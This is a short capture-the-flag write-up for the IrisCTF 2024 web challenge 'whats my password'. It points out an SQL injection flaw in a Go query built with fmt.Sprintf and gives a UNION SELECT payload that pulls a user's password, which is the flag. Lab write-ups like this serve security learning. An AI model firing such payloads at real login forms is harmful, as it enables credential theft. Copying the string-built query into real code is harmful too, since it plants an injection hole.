---
title: "whats my password - IrisCTF 2024"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "union-select", "golang", "sprintf", "whats", "password"]
summary: "[baby] Oh no! Skat forgot their password (again)!"
source:
  name: "bl4de/ctf"
  url: "https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2024/IrisCTF_2024/whats-my-password/whats_my_password_solution.md"
ctf:
  name: "IrisCTF"
  year: 2024
  challenge: "whats my password"
---

## Source

- **CTF:** IrisCTF 2024
- **Challenge:** whats my password
- **Repository:** [bl4de/ctf](https://github.com/bl4de/ctf)
- **File:** <https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2024/IrisCTF_2024/whats-my-password/whats_my_password_solution.md>

---
## What's My Password? (Web)

## Problem

[baby] Oh no! Skat forgot their password (again)!
 
Can you help them find it?

![](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2024/IrisCTF_2024/whats-my-password/screen1.png)

## Solution

### setup.sql

From `setup.sql` we know that flag is stored as a password for user `skat`:
```sql
CREATE TABLE IF NOT EXISTS users ( username text, password text );
INSERT INTO users ( username, password ) VALUES ( "root", "IamAvEryC0olRootUsr");
INSERT INTO users ( username, password ) VALUES ( "skat", "fakeflg{fake_flag}");
INSERT INTO users ( username, password ) VALUES ( "coded", "ilovegolang42");
```

### main.go

In `main.go`, there is an SQL Injection vulnerability in line 65:

```go
qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)
```

To obtain the flag, we can use following payload as password:

```
password" or 1=2 union select username,password from users where username="skat"-- - 
```

Flag: `irisctf{my_p422W0RD_1S_SQl1}`
